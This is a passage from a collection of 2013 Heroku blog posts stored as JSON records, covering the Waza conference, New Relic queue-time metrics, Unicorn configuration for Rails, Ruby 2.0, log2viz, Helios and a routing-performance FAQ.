pour-over coffee while you get to know some Herokai. But don’t worry, this cup-at-a-time coffee service will be available all day. Tea Lounge : We know some people prefer tea, including many of our own staff, so we’ve set aside space for the Waza tea lounge where you’ll find a variety of loose-leaf teas. Food Trucks : We will have an assortment of local food trucks offering a selection of lunch specials. Use the ticket on your badge and select your favorite. ##Don’t Want to Deal with Parking? Secure bike parking will be available thanks to the fine folks at the San Francisco Bicycle Coalition . ##Meet our Sponsors #### Atlassian Well-known for their collaboration tools that help teams build better products, Atlassian is providing Waza with co-working spaces to get the job done. #### DODOcase Creating artisan products for technology is the core of DODOcase’s business. Stop by and create your own Waza-branded, hand-bound notepad to take home . #### GitHub We all know that GitHub knows how to throw a great party, so we’re pumped that they are sponsoring the Waza afterparty. The fun starts at 9 p.m., and everyone with a Waza badge is invited. #### MongoHQ We are pleased to have an origami artist, Linda Mihara as part of the Waza experience. And thanks to MongoHQ for adding rockets to her repertoire. Learn the ancient art of paper folding and make your own shiny silver rocket to take home. #### Neo4j Adding an art experience to one of the lounges, Neo4j is bringing an amazing Zen Table to Waza. They’ll also use their superstar graphing skills to monitor and display the event’s Twitter activity. #### Neon Roots A full service interactive agency specializing in custom web & mobile development that contributed to our web site. #### New Relic Cheers! Thanks to New Relic, we’ll be serving craft beers at Happy Hour. To kick things off at 5 p.m., an expert from 21st Amendment Brewery will share how those delicious flavors you’re enjoying came to be. #### SendGrid SendGrid is bringing us a Waza first: Arduino hacking in the Garden! If you are new to Arduino, SendGrid will be leading two intro talks to get you started. If you’re already an Arduino, just sit down and hack! You might even win an Arduino kit to take home. #### Treasure Data Saving us all from huddling in a corner near a power source, or missing anything to charge our laptops, Treasure Data is providing Waza attendees with two power valet stations. Drop off your electronics to be safely stored and charged while you enjoy the talks and activities. ##Register Now February 28th is less than two short weeks away.  If you haven’t registered yet, now is the time. Looking forward to seeing you all at the Concourse for a sure-to-be-epic Waza! waza", "date": "2013-02-20,"},
{"website": "Heroku", "title": "Better Queuing Metrics With Updated New Relic Add-On", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/better_queuing_metrics_with_updated_new_relic_add_on", "abstract": "Better Queuing Metrics With Updated New Relic Add-On Posted by Jesper Joergensen February 21, 2013 Listen to this article Today our partner, New Relic , released an update to the Ruby New Relic agent that addresses issues brought up by our customers. The new version corrects how New Relic reports performance metrics for applications running on Heroku. Queueing time is now reported as the total time from when a request enters the router until the application starts processing it. Previous versions of New Relic only reported queueing time in the router. The new approach will result in more accurate queueing metrics that allow you to better understand and tune the performance of your application. Update, Feb 22: New Relic has released a similar update for Python . Python developers should update to this latest version to benefit from the improved metrics. JVM language developers do not need to take any action. The current New Relic Java agent already includes the improved queue time metrics. Install or update the New Relic Ruby Add-on If you are already using New Relic with your Ruby apps, then simply update your Gemfile to reference the new agent version: gem \"newrelic_rpm\", \"~> 3.5.7.59\" then run $ bundle update newrelic_rpm\n$ git add Gemfile Gemfile.lock\n$ git commit -m 'update new relic agent'\n$ git push heroku master If you are not yet using New Relic, you can learn how to install and configure the add-on on Dev Center. How It Works The updated New Relic agent uses an improved strategy for reporting request queue times on Heroku. Prior to this update, New Relic reported request queue time using a value set by the Heroku routing mesh. This only reflected the time a request spent in the router queue and did not properly include time spent waiting in the dyno’s request queue. Our routing performance update documents our finding that some applications have requests that may spend significant time queued on dynos. To help our customers understand precisely where their applications are being delayed, the updated New Relic agent includes dyno wait time in the total queue time metric. The new queue time is calculated as the difference between the time the Heroku router first gets a request and the time the request begins processing on the dyno. The result is a more accurate picture of how long requests wait in queues. Clock Skew The new version of New Relic calculates queue times using two different clocks — the dyno and router clocks. While Heroku servers regularly sync their clocks , it’s common for clocks to drift apart between syncs. This phenomenon is known as clock skew and it can affect the queue time metric collected by New Relic. In our experience, even though clock skew can cause small inaccuracies, the overall trend data displayed by New Relic will still accurately reflect your application’s queue times. How to Learn More If you’d like more information on how to install and configure the New Relic add-on, please see the New Relic Dev Center article and the Unicorn specific instructions . For general suggestions on how to improve the performance of your app, check out our performance overview page .", "date": "2013-02-21,"},
{"website": "Heroku", "title": "Concurrency is not Parallelism. Rob Pike at Waza 2012 [video]", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/concurrency_is_not_parallelism", "abstract": "Concurrency is not Parallelism. Rob Pike at Waza 2012 [video] Posted by Craig Kerstiens February 24, 2013 Listen to this article In planning Waza 2013 we went back to reflect on last year’s speakers.  And we want to make the talks readily available to anybody who could not make it last year—or who wants a refresher. Check back soon for more talks from Waza 2012. And we hope to see you in person at Waza 2013 coming up FAST on Feb. 28 in San Francisco. In a world of evolving languages, frameworks and development patterns, we developers must continually improve our craft. Innovative developers already have jumped on board many of these shifts. We’ve seen this with the adoption of more agile frameworks (such as Rails, Django, and Play). We’ve seen it too with a shift towards asynchronous programming patterns such as in Node.js and with evented programming in Rails. One clear example of this evolution is the re-emergence of a focus on concurrency. Rob Pike —with the help of a few gophers—gave this fantastic educational talk on concurrency at last year’s Heroku waza conference. Rob covered big themes that are important to developers—speed, efficiency and productivity. And he covered parallelism and concurrency in programming processes—making it very clear that they are not the same thing. If you want to click through Rob’s slides while watching, they are hosted at GoogleCode . Rob ( @rob_pike ) is a software pioneer. His influence is everywhere: Unix, Plan 9 OS, The Unix Programming Environment book, UTF-8, and most recently the Go programming language . Waza is the Japanese word for art and technique and it's where we celebrate craft and the creative process of software development with technical sessions and interactive artistic happenings .", "date": "2013-02-24,"},
{"website": "Heroku", "title": "Idea to Delivery: Application Development in the Modern Age. Adam Wiggins at Waza 2012 [video] ", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/idea_to_delivery", "abstract": "Idea to Delivery: Application Development in the Modern Age. Adam Wiggins at Waza 2012 [video] Posted by Craig Kerstiens February 27, 2013 Listen to this article Great coders know their technology intimately. And they know how to choose it. Truly awesome application developers know more. They know the human side of technology. They know technique. They focus on their method—their practice. In 2000 Heroku co-founder and CTO Adam Wiggins saw this more clearly than ever before. He read The Pragmatic Programmer by Andy Hunt and Dave Thomas . The book, as Adam explains in this thought-provoking (and method-shifting) Waza talk, showed him that his work could not only be about technology. It HAD to be about technique. Heroku Co-founder, CTO and general badass, Adam Wiggins Adam discusses techniques—historical ones such as agile development and the power of rapid and flexible response to change; frameworks which helped drive speed by allowing developers to focus on the specifics of their application without having to reinvent basic wheels of, say, state management and request handling; the cloud which removed a huge burden of selecting, purchasing and maintaining hardware; and Software as a Service (SaaS), which, in addition to providing incredible benefit to end-users has created a development culture of continual, rapid improvement. Technique means a lot. How we think about and describe what we do means a great deal too. Adam makes a strong point when he compares thinking and describing ourselves as programmers vs. application developers.  Application developers, Adam says, think more broadly. They think about the end-to-end process of developing and deploying an application. \n vs. vs. By taking ownership of thinking across the full spectrum from idea to delivery, application developers play a far more strategic role in their app—and their company’s—growth and success. Developers who think and work like this are truly “ the new kingmakers ” and a “powerful force to be reckoned with.” Adam shares newer, even more powerful techniques that will help a developer who wants to think more broadly, act more strategically, and increase efficiency in her or his organization. Adam also discusses a number of these in The Twelve-Factor App : Deploying from Day One and Continuous Development/Deployment Having one (version controlled) codebase that is deployed in various states of completion across several instances from a live production app/site to development environments of different employees’ machines means we can all move faster and we can all stay in tune with one another. It means we can be deploying from day one and we can rapidly improve our products via continuous development and deployment. Development and Production Parity: Keeping development, staging, and production as similar as possible Historically, there have been substantial gaps between development (a developer making live edits to a local deploy of the app) and production (a running deploy of the app accessed by end users). These gaps, as Adam discussed at Waza and at The Twelve-Factor App manifest in three areas: The time gap: A developer may work on code that takes days, weeks, or even months to go into production. The personnel gap: Developers write code, ops engineers deploy it. The tools gap: Developers may be using a stack like Nginx, SQLite, and OS X, while the production deploy uses Apache, MySQL, and Linux. Staying Close to Production As we've come to appreciate agile development techniques and put such a sharp focus on shipping features, minimizing each of these gaps allows developers to: Make the time gap small: a developer may write code and have it deployed hours or even just minutes later. Make the personnel gap small: developers who wrote code are closely involved in deploying it and watching its behavior in production. Make the tools gap small: keep development and production as similar as possible. Conclusion We have come along way since The Pragmatic Programer. But it remains highly influential and set much of the tone for the many pragmatic developments in technique and practice that have come to the fore in recent years. You could say that Adam reading The Pragmatic Programmer back in 2000 is one of the reasons we invite developers to come together for Waza, which happens tomorrow . And one of the reasons we share the talks freely online for those who cannot make it. Waza is all about technique, about personal improvement for developers, about, as the subtitle of The Pragmatic Programmer says, the journey from journeyman to master.", "date": "2013-02-27,"},
{"website": "Heroku", "title": "Adding Concurrency to Rails Apps with Unicorn", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/unicorn_rails", "abstract": "Adding Concurrency to Rails Apps with Unicorn Posted by Richard Schneeman February 26, 2013 Listen to this article With support for Node.js, Java, Scala and other multi-threaded languages, Heroku allows you to take full advantage of concurrent request processing and get more performance out of each dyno. Ruby should be no exception. If you are running Ruby on Rails with Thin, or another single-threaded server, you may be seeing bottlenecks in your application. These servers only process one request at a time and can cause unnecessary queuing. Instead, you can improve performance by choosing a concurrent server such as Unicorn which will make your app faster and make better use of your system resources. In this article we will explore how Unicorn works, how it gives you more processing power, and how to run it on Heroku. Concurrency and Forking At the core of Heroku is the Unix Philosophy , and we see this philosphy at work in Unicorn. Unicorn uses the Unix concept of forking to give you more concurrency. Process forking is a critical component of Unix's design. When a process forks it creates a copy of itself. Unicorn forks multiple OS processes within each dyno to allow a Rails app to support multiple concurrent requests without requiring them to be thread-safe. This means that even if your app is only designed to handle one request at a time, with Unicorn you can handle concurrent connections. Unicorn leverages the operating system to do most of the heavy lifting when creating and maintaining these forks. Unix-based systems are extremely efficient at forking, and even take advantage of Copy on Write optimizations that are similar to those in the recently released Ruby 2.0 . Unicorn on Rails By running Unicorn in production, you can significantly increase throughput per dyno and avoid or reduce queuing when your app is under load. Unicorn can be difficult to setup and configure, so we’ve provided configuration documentation to make it easier to get started. Let's set up a Rails app to use Unicorn. Setting up Unicorn First, add Unicorn to your application Gemfile : gem 'unicorn' Run $ bundle install , now you are ready to configure your app to use Unicorn. Create a configuration file for Unicorn at config/unicorn.rb : $ touch config/unicorn.rb Now we're going to add Unicorn-specific configuration options, that we explain in detail in Heroku's Unicorn documentation : # config/unicorn.rb\nworker_processes 3\ntimeout 30\npreload_app true\n\nbefore_fork do |server, worker|\n\n  Signal.trap 'TERM' do\n    puts 'Unicorn master intercepting TERM and sending myself QUIT instead'\n    Process.kill 'QUIT', Process.pid\n  end\n\n  defined?(ActiveRecord::Base) and\n    ActiveRecord::Base.connection.disconnect!\nend\n\nafter_fork do |server, worker|\n\n  Signal.trap 'TERM' do\n    puts 'Unicorn worker intercepting TERM and doing nothing. Wait for master to sent QUIT'\n  end\n\n  defined?(ActiveRecord::Base) and\n    ActiveRecord::Base.establish_connection\nend This default configuration assumes a standard Rails app with Active Record, see Heroku's Unicorn documentation for more information. You should also get acquainted with the different options in the official Unicorn documentation . Now that we've got your app setup to use Unicorn, you’ll need to tell Heroku how to run it in production. Unicorn in your Procfile Change the web command in your Procfile to: web: bundle exec unicorn -p $PORT -c ./config/unicorn.rb Now try running your server locally with $ foreman start . Once you're happy with your changes, commit to git, deploy to staging, and when you're ready deploy to production. A World of Concurrency With the recent release of the Rails 4 beta , which is threadsafe by default, it's becoming increasingly clear that Rubyists care about concurrency. Unicorn gives us the ability to take multiple requests at a time, but it is by no means the only option when it comes to concurrent Rack servers. Another popular alternative is Puma which uses threads instead of forking processes. Puma does however require that your code is threadsafe . If you've never run a concurrent server in production, we encourage you to spend some time exploring the ecosystem. After all no one knows your app's requirements better than you. Whatever you do don't settle for one request at a time. Demand  performance, demand concurrency, and try Unicorn today . rails ruby unicorn concurrency rack", "date": "2013-02-26,"},
{"website": "Heroku", "title": "Matz on Ruby 2.0 at Heroku's Waza", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/matz_highlights_ruby_2_0_at_waza", "abstract": "Matz on Ruby 2.0 at Heroku's Waza Posted by Craig Kerstiens March 06, 2013 Listen to this article Matz , the creator of Ruby, spoke at Waza for the 20th anniversary of the language and the release of Ruby 2.0 . If you weren't in the sold out crowd, not to worry. Information should flow free and experiences should be shared; in line with those concepts you can watch Matz's talk right here, then read about what's new in this version of Ruby and how to run it on Heroku. With slides available on speakerdeck Keep reading for more information on Ruby 2.0 or check out our first batch of videos from Waza 2013 . To stay up to date as we post new videos, follow us @heroku . Compatibility Iterating quickly means happier developers and happier customers. We optimize our platform to allow you to develop, stage, and deploy faster. Not only does this make running software easier, but it makes trying new technologies like Ruby 2.0 as simple as spinning up a new app. During Matz's talk at Waza, he mentioned that, while 1.9.3 is popular now, it took years after 1.8.7 was released to gain traction. With the release of Ruby 2.0 Matz hopes to reduce upgrading barriers and allow developers to iterate quicker using newer, faster and better tools. Ruby 2.0 was written to be backwards compatible and it works with Rails 3.2.13 out of the box. If your Ruby apps are running using 1.8.7, you should upgrade. Ruby 1.8.7 is approaching End of Life (EOL) in three months on June 2013. EOL for Ruby 1.8.7 means no security or bug patches will be provided by the maintainers. Not upgrading means you're potentially opening up your application and your users to vulnerabilities. Don't wait till the final hour, upgrade now to be confident and secure. Speed Ruby 2.0 has a faster garbage collector and is Copy on Write friendly. Copy on Write or COW is an optimization that can reduce the memory footprint of a Ruby process when it is copied.  Instead of allocating duplicate memory when a process is forked, COW allows multiple processes to share the same memory until one of the processes needs to modify a piece of information. Depending on the program, this optimization can dramatically reduce the amount of memory used to run multiple processes. Most Ruby programs are memory bound, so reducing your memory footprint with Ruby 2.0 may allow you to run more processes in fewer dynos. If you’re not already running a concurrent backend consider trying the Unicorn web server . Features In addition to running faster than 1.9.3, and having a smaller footprint, Ruby 2.0 has a number of new features added to the language including: Keyword arguments Kernel#require optimization which makes Rails startup very fast Copy on write Dtrace support Module#prepend Enumerable#lazy Use __dir__ to get the current directory of __FILE__ UTF-8 is now the default encoding Much, much more The list of new features is more than we can cover here. If you really wanted to dig in you can check the Ruby changelog Running 2.0 on Heroku If you’re interested in taking advantage of these new features give it a try on Heroku today. To run Ruby 2.0 on Heroku you'll need this line in your Gemfile : ruby \"2.0.0\" Then commit to git: $ git add .\n$ git commit -m \"Using Ruby 2.0 in production\" We recommend that you test your app using 2.0 locally and deploy to a staging app before pushing to production. Now when you $ git push heroku master our Ruby buildpack will see that you've declared your Ruby version and make sure you get the right one. 20 years of simplicity, elegance, and programmer happiness Heroku, since its founding, has been aligned with the key values of Ruby – simplicity, elegance, and programmer happiness. Heroku still believes in the power and flexibility of Ruby, and we've invested in the language by hiring Yukihiro \"Matz\" Matsumoto , Koichi Sasada and Nobuyoshi Nakada . We would like to thank them and the whole Ruby core team for making this release happen. Join us in celebrating Ruby's successes and in looking forward to the next twenty years by trying Ruby 2.0 on Heroku today.", "date": "2013-03-06,"},
{"website": "Heroku", "title": "Jacob Kaplan-Moss, Django Co-Creator, Talks Ecosystems at Heroku's Waza", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/jacob_kaplan_moss_on_creating_ecosystems", "abstract": "Jacob Kaplan-Moss, Django Co-Creator, Talks Ecosystems at Heroku's Waza Posted by Craig Kerstiens March 09, 2013 Listen to this article The value of a network is proportional to the square of the number of users connected to the system, according to Metcalfe’s law. Jacob Kaplan-Moss , co-creator of Django , highlights this as a value in creating communities or as he puts it, “ecosystems”. In his talk at Waza last week on building ecosystems, he went on to highlight three key principles of creating ecosystems: APIs to support extensibility Conservatism as a value Empowering the community Whether building a platform or a framework, these key principles ring true. Check out his talk or read more on creating ecosystems below: APIs to support extensibility You don’t choose to become an ecosystem, but you can choose to do the groundwork. By defining APIs you enable others to build on the foundation you lay. Django core member Russ Keith-McGee summed this up quite clearly on the Django mailing list – \"I’m not sure if this is appropriate, but it should be possible. If its not possible we should build the APIs to support it.\" This sentiment is at the core of building ecosystems. Django succeeded at this with its apps API, and has a full directory in Django Packages to help others discover what has already been built. At Heroku we’re seeing the same phenomon with our buildpacks API resulting in numerous third-party buildpacks . By building APIs and empowering users, you solve more problems. Conservatism as a value There’s great value in the “move fast and break stuff” concept. However, creating explicit APIs and contracts that are stable is critical for an ecosystem to thrive longer term. For Django as a framework this means being slow moving and reliable when it comes to modifying any APIs in the core framework. For Heroku as a platform it means a dedication to erosion resistance . Jacob cleanly highlights this by pointing out that “Interoperabilty only works when the common parts don’t change.” Empowering the community Ecosystems create ways for the community to engage and contribute. With an ecosystem there’s even additional ways in which users can contribute and those contributions don’t have to be code. When a project first starts, it’s creator tests it and consumes it acting as developer and QA. As it gains popularity a project may attract new developers, then more users, who submit their own bug reports and issues. These newcomers contribute documentation patches, triage tickets, and recruit others to help with the project. Where once a single developer committed quietly, now a thriving ecosystem of contributors and consumers exists. This change from product to ecosystem doesn’t happen overnight, it must be nurtured and nudged. Kaplan-Moss, a self-proclaimed “documentation nut” has done just that by cultivating a better understanding of Django through documentation and carefully working with patch and issue submitters. Jacob explains that if you document your process, you can increase transparency and understanding of the way things work. Django does this by clearly documenting how users can contribute back to Django ; at Heroku we’ve done this by documenting our methodology on how apps should be built. Conclusion Building a great product isn’t enough, as Jacob points out: you’ve got to create a vibrant community and build an ecosystem. If it wasn’t for Django’s community there wouldn’t be over 3500 Python packages for Django. If it wasn’t for our community, you wouldn’t be able to deploy Go , common lisp , or GeoDjango to Heroku with just one command. Learn more about ecosystems by listening to Jacob’s talk , check out other talks from Waza available now , or engage with the ecosystem of your choice today.", "date": "2013-03-09,"},
{"website": "Heroku", "title": "Running Rails on Heroku Update", "author": ["Oren Teich"], "link": "https://blog.heroku.com/running_rails_on_heroku_update", "abstract": "Running Rails on Heroku Update Posted by Oren Teich March 13, 2013 Listen to this article On February 16th, we published a blog post outlining five specific and immediate actions we would take to improve our Rails customers' experience with Heroku. We want to provide you with an update on where these things stand. As a reminder, here’s what we committed to do: Improve our documentation so that it accurately reflects how our service works across both Bamboo and Cedar stacks Remove incorrect and confusing metrics reported by Heroku or partner services like New Relic Add metrics that let customers determine queuing impact on application response times Provide additional tools that developers can use to augment our latency and queuing metrics Work to better support concurrent-request Rails apps on Cedar We have resolved the first two items: Improving Documentation : We’ve updated our Dev Center docs and website to more accurately describe how routing occurs on Heroku (e.g., HTTP Routing on Bamboo and How Routing Works on the Bamboo Stack ). Removing Incorrect Metrics : We’ve worked with New Relic to release an updated version of their monitoring tools, which we documented in Better Queuing Metrics With Updated New Relic Add-on . We are working on the remaining three items in partnership with our early beta users: Adding New Metrics : We are improving the data available through our logs in two ways. First, we’re adding a transaction ID to every request log. Second, we are working on application middleware to provide additional metrics in customer logs. Providing Additional Measurement Tools : We have created a data visualization tool that analyzes log data in real-time and helps observe an app’s performance across a few key Heroku-specific metrics. This tool is currently being beta tested. Improving Cedar Support : Unicorn is now the recommended Rails app server. We are currently beta testing larger dynos to support additional unicorn processes. Fulfilling these commitments is Heroku’s number one priority. We have dedicated engineering and product teams focused on improving the performance of Rails apps on Heroku. We’ll detail the availability of our improvements in future blog posts. If you would like to beta test any of these new features, please drop us a note and let us know which features you are interested in testing.", "date": "2013-03-13,"},
{"website": "Heroku", "title": "log2viz: Logs as Data for Performance Visibility", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/log2viz", "abstract": "log2viz: Logs as Data for Performance Visibility Posted by Adam Wiggins March 19, 2013 Listen to this article ** THIS FEATURE IS NOW DEFUNCT ** If you’re building a customer-facing web app or mobile back-end, performance is a critical part of user experience. Fast is a feature , and affects everything from conversion rates to your site’s search ranking . The first step in performance tuning is getting visibility into the app’s web performance in production. For this, we turn to the app’s logs. Logs as data There are many ways to collect metrics, the most common being direct instrumentation into the app. New Relic , Librato , and Hosted Graphite are cloud services that use this approach, and there are numerous roll-your-own options like StatsD and Metrics . Another approach is to send metrics to the logs. Beginning with the idea that logs are event streams , we can use logs for a holistic view of the app: your code, and the infrastructure that surrounds it (such as the Heroku router). Mark McGranaghan’s Logs as Data and Ryan Daigle’s 5 Steps to Better Application Logging offer an overview of the logs-as-data approach. Put simply, logs as data means writing semi-structured data to your app's logs via STDOUT. Then the logs can be consumed by one or more services to do dashboards, long-term trending, and threshold alerting. The benefits of logs-as-data over direct instrumentation include: No additional library dependencies for your app No CPU cost to your dyno by in-app instrumentation Introspection capability by reading the logs directly Metrics back-ends can be swapped out without changes to app code Possible to split the log stream and send it to multiple back-ends, for different views and alerting on the same data Introducing log2viz, a public experiment log2viz is an open-source demonstration of the logs-as-data concept for Heroku apps. Log in and select one of your apps to see a live-updating dashboard of its web activity. For example, here’s a screenshot of log2viz running against the Rubygems Bundler API (written and maintained by Terence Lee, André Arko, and Larry Marburger, and running on Heroku): log2viz gets all of its data from the Heroku log stream — the same data you see when running heroku logs --tail at the command line. It requires no changes to your app code and works for apps written in any language and web framework, demonstrating some of the benefits of logs as data. Also introducing: log-runtime-metrics In order to get memory use stats for your dynos, we’ve added a new experimental feature to Heroku Labs to log CPU and memory use by the dyno: log-runtime-metrics . To enable this for your app (and see memory stats in log2viz), type the following: $ heroku labs:enable log-runtime-metrics -a myapp\n$ heroku restart This inserts data into your logs like this: heroku[web.1]: measure=load_avg_5m val=0.0\nheroku[web.1]: measure=memory_total val=209.64 units=MB log2viz reads these stats and displays average and max memory use across your dynos. (Like all Labs features, this is experimental and the format may change in the future.) Looking under the hood log2viz is open source. Let’s look at the code: It uses OAuth via heroku-bouncer to connect to your Heroku account and make API calls to access information about your apps. It reads from your app's log stream . This is the same API endpoint that the Heroku CLI connects to when you run heroku logs --tail . It's written in Ruby and uses the Sinatra streaming API (an EventMachine implementation of Server-sent Events ) to handle both the incoming log data and outgoing live updates to the user's browser. It uses the Heroku API when you connect to the page to fetch the app's name and number of web dynos . It takes a hint for concurrency per dyno based on the WEB_CONCURRENCY config var. All of the metrics are derived from 60 seconds of data, stored in-memory in the user’s browser . (Storing historical data would enable trend analysis, but we chose to leave that out of scope for this experiment.) log2viz only subscribes to the app’s logs while the page is open in your browser. Closing the window also closes the log connection. You can deploy your own copy of log2viz on Heroku , so fork away! For example, Heroku customer Timehop has experimented with trending graphs via Rickshaw . Logs-as-data add-ons log2viz isn't the only way to take advantage of your log stream for visibility on Heroku today. Here are a few add-ons which consume your app's logs. Loggly offers a web console that lets you search your log history, and graph event types over time. For example, let’s search for status=404, logged by the Heroku router whenever your app serves a page not found: Papertrail offers search archival and history, and can also alert on events when they pass a certain threshold. Here’s how you can set up an email alert every time your app experiences more than 10 H12 errors in a 60 second period. Search for the router log line: Click “Save Search,” then: Other add-ons that consume logs include Treasure Data and Logentries . You can also use non-add-on cloud services, as shown in thoughtbot's writeup on using Splunk Storm with Heroku . Conclusion Visibility is a vast and challenging problem space. The logs-as-data approach is still young, and log2viz is just an experiment to get us started. We look forward to your feedback on log2viz, log visibility via add-ons, and your own experiments on performance visibility.", "date": "2013-03-19,"},
{"website": "Heroku", "title": "Helios - open source framework for mobile", "author": ["Mattt Thompson"], "link": "https://blog.heroku.com/helios", "abstract": "Helios - open source framework for mobile Posted by Mattt Thompson April 02, 2013 Listen to this article Heroku has a strong tradition with open source projects. Engineers have dedicated countless hours to the projects that developers count on every day. Open Source Software is in our DNA. Speaking personally, I’m passionate about building tools like AFNetworking and cupertino , in order to help developers build insanely great experiences for mobile devices. It’s with great pleasure that I introduce something new I’ve been working on: Helios is an open-source framework that provides essential back-end services for iOS apps. This includes data synchronization, push notifications, in-app purchases, and passbook integration. It allows developers to get a client-server app up-and-running while seamlessly incorporating functionality as necessary. Helios is designed for \"mobile first\" development. Build out great features on the device, and implement the server-side components as necessary. Pour all of your energy into crafting a great user experience, rather than getting mired down with the back-end. Built on the Rack webserver interface, Helios can be easily added into any existing Rails or Sinatra application. Or, if you're starting with a Helios application, you can build a new Rails or Sinatra application on top of it. This means that you can develop your application using the tools and frameworks you love, and maintain flexibility with your architecture as your needs evolve. Give it a try and let me know what you think! rails heroku helios open source sinatra iOS mobile", "date": "2013-04-02,"},
{"website": "Heroku", "title": "Routing and Web Performance on Heroku: a FAQ", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/routing_and_web_performance_on_heroku_a_faq", "abstract": "Routing and Web Performance on Heroku: a FAQ Posted by Adam Wiggins April 03, 2013 Listen to this article Hi. I'm Adam Wiggins, cofounder and CTO of Heroku. Heroku has been my life’s work. Millions of apps depend on us, and I take that responsibility very personally. Recently, Heroku has faced criticism from the hacker community about how our HTTP router works, and about web performance on the platform in general. I’ve read all the public discussions, and have spent a lot of time over the past month talking with our customers about this subject. The concerns I've heard from you span past, present, and future. The past: some customers have hit serious problems with poor web performance and insufficient visibility on their apps, and have been left very frustrated as a result. What happened here? The present: how do you know if your app is affected, and if so what should you do? And the future: what is Heroku doing about this? Is Heroku a good place to run and scale an app over the long term? To answer these questions, we’ve written a FAQ, found below. It covers what happened, why the router works the way that it does, whether your app is affected by excessive queue time, and what the solution is. As to the future, here’s what we’re doing. We’re ramping up hands-on migration assistance for all users running on our older stack, Bamboo, or running a non-concurrent back-end on our new stack, Cedar. (See the FAQ for why this is the fix.) We’re adding new features such as 2X dynos to make it easier to run concurrent back-ends for large Rails apps. And we're making performance and visibility a bigger area of product attention, starting with some tools we've already released in the last month. If you have a question not answered by this FAQ, post it as a comment here, on Hacker News , or on Twitter . I’ll attempt to answer all such questions posted in the next 24 hours. To all our customers who experienced real pain from this: we're truly sorry. After reading this FAQ, I hope you feel we're taking every reasonable step to set things right, but if not, please let us know. Adam Overview Q. Is Heroku’s router broken? A. No. While hundreds of pages could be written on this topic, we’ll address some of this in Routing technology . Summary: the current version of the router was designed to provide the optimum combination of uptime, throughput, and support for modern concurrent back-ends. It works as designed. Q. So what’s this whole thing about then? A. Since early 2011, high-volume Rails apps that run on Heroku and use single-threaded web servers sometimes experienced severe tail latencies and poor utilization of web back-ends (dynos). Lack of visibility into app performance, including incorrect queue time reporting prior to the New Relic update in February 2013 , made diagnosing these latencies (by customers, and even by Heroku’s own support team) very difficult. Q. What types of apps are affected? A. Rails apps running on Thin, with six or more dynos, and serving 1k reqs/min or more are the most likely to be affected. The impact becomes more pronounced as such apps use more dynos, serve more traffic, or have large request time variances. Q. How can I tell if my app is affected? A. Add the free version of New Relic ( heroku addons:add newrelic ) and install the latest version of the newrelic_rpm gem, then watch your queue time. Average queue times above 40ms are usually indicative of a problem. Some apps with lower request volume may be affected if they have extremely high request time variances (e.g., HTTP requests lasting 10+ seconds) or make callbacks like this OAuth example . Q. What’s the fix? A. Switch to a concurrent web back-end like Unicorn or Puma on JRuby , which allows the dyno to manage its own request queue and avoid blocking on long requests. This requires that your app be on our most current stack, Cedar . Q. Can you give me some help with this? A. Certainly. We’ve already emailed all customers with apps running on Thin with more than six dynos with self-migration instructions, and a way to reach us for direct assistance. If you haven’t received the email and want help making the switch, contact us for migrating to Cedar or migrating to Unicorn . Routing technology Q. Why does the router work the way that it does? A. The Cedar router was built with two goals in mind: (1) to support the new world of concurrent web back-ends which have become the standard in Ruby and all other language communities; and (2) to handle the throughput and availability needs of high-traffic apps. Read detailed documentation of Heroku’s HTTP routing . Q. Even with concurrent web back-ends, wouldn’t a single global request queue still use web dynos more efficiently? A. Probably, but it comes with trade-offs for availability and performance. The Heroku router favors availability, stateless horizontal scaling, and low latency through individual routing nodes. Per-app global request queues require a sacrifice on one or more of these fronts. See Kyle Kingsbury’s post on the CAP theorem implications for global request queueing . After extensive research and experimentation, we have yet to find either a theoretical model or a practical implementation that beats the simplicity and robustness of random routing to web back-ends that can support multiple concurrent connections. Q. So does that mean you aren’t working on improving HTTP performance? A. Not at all. We're always looking for new ways to make HTTP requests on Heroku faster, more reliable, and more efficient. For example, we’ve been experimenting with backpressure routing for web dynos to signal to the router that they are overloaded. You, our customers, have told us that it’s not routing algorithms you ultimately care about, but rather overall web performance. You want to serve HTTP requests as quickly as possible, for fast page loads or API calls for your users. And you want to be able to quickly and easily diagnose performance problems. Performance and visibility are what matters, and that’s what we’ll work on. This will include ongoing improvements to dynos, the router, visibility tools, and our docs. Retrospective Q. Did the Bamboo router degrade? A. Yes. Our older router was built and designed during the early years of Heroku to support the Aspen and later the Bamboo stack. These stacks did not support concurrent back-ends, and thus the router was designed with a per-app global request queue. This worked as designed originally, but then degraded slowly over the course of the next two years . Q. Were the docs wrong? A. Yes, for Bamboo. They were correct when written, but fell out of date starting in early 2011. Until February 2013, the documentation described the Bamboo router only sending one connection at a time to any given web dyno. Q. Why didn’t you update Bamboo docs in 2011? A. At the time, our entire product and engineering team was focused on our new product, Cedar. Being so focused on the future meant that we slipped on stewardship of our existing product. Q. Was the \"How It Works\" section of the Heroku website wrong? A. Yes. Similar to the docs, How It Works section of our website described the router as tracking which dynos were tied up by long HTTP requests. This was accurate when written, but gradually fell out of date in early 2011. Unlike the docs, we completely rewrote the homepage in June of 2011 and it no longer referenced tracking of long requests. Q. Was the queue time metric in New Relic wrong? A. Yes, for the same 2011—2013 period from previous questions. The metric was transmitted to the New Relic instrumentation in the app via a set of HTTP headers set by the Heroku router. The root cause was the same as the Bamboo router degradation: the code didn't change, but scaling out the router nodes caused the data to become increasingly inaccurate and eventually useless. With New Relic's help, we fixed this in February 2013 by calculating queue time using a different method. Q. Why didn’t Heroku take action on this until Rap Genius went public? A. We’re sorry that we didn’t take action on this based on the customer complaints via support tickets and other channels sooner. We didn’t understand the magnitude of the confusion and frustration caused by the out-of-date Bamboo docs, incorrect queue time information in New Relic, and the general lack of visibility into web performance on the platform. The huge response to the Rap Genius post showed us that this touched a nerve in our community. The Future Q. What are we doing to make things right from here forward? A. We’ve been working with many of our customers to get their queue times down, get them accurate visibility into their app’s performance, and make sure their app is fast and running on the right number of dynos. So far, the results are good . Q. What about everyone else? A. If we haven’t been in touch yet, here’s what we’re doing for you: Migration assistance: We’ll give you hands-on help migrating to a concurrent back-end, either individually or in online workshops. This includes the move to Cedar if you’re still on Bamboo. If you’re running a multi-dyno app on a non-concurrent back-end and 